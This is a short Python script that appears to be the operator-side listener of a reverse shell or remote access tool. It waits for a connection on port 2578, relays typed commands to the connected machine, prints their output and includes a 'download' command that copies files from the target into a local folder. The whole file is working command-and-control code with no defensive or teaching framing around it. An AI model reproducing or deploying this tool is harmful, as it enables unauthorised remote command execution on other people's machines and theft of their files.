import socket
import sys

class server:
    def __init__(self,host,port):
        self.host = host
        self.port = port
        self.waitingConnection()

    def waitingConnection(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((self.host, self.port))
        sock.listen(1)
        print("[+] Listening Connection : ", self.host)
        # Accept connection with sock.accept(). 'client' means client connection & 'addr' means client address.
        self.client, addr = sock.accept()
        print("[+] Got a Connection from : ", addr)
        self.target_sys_info = self.client.recv(1024)

    def exeucteShell(self):

        cmd = input(self.target_sys_info.decode() + " ")
        # cmd = input('Shell-->')
        self.client.send(cmd.encode())
        if 'exit' in cmd:
            sys.exit()
        elif cmd == 'download':
            file_name = input('File name: ')
            self.client.send(file_name.encode())
            file = open('./download/' + file_name, 'wb')
            while True:
                data = self.client.recv(1024)
                if data.endswith('DONE'.encode()):
                    file.write(data[:-4])
                    file.close()
                    print('Download Complete.')
                    break
                file.write(data)
        else:
            print(self.client.recv(1024).decode())


if __name__ == "__main__":
    host = "localhost"
    port=2578
    server = server(host,port)
    while True:
        server.exeucteShell()
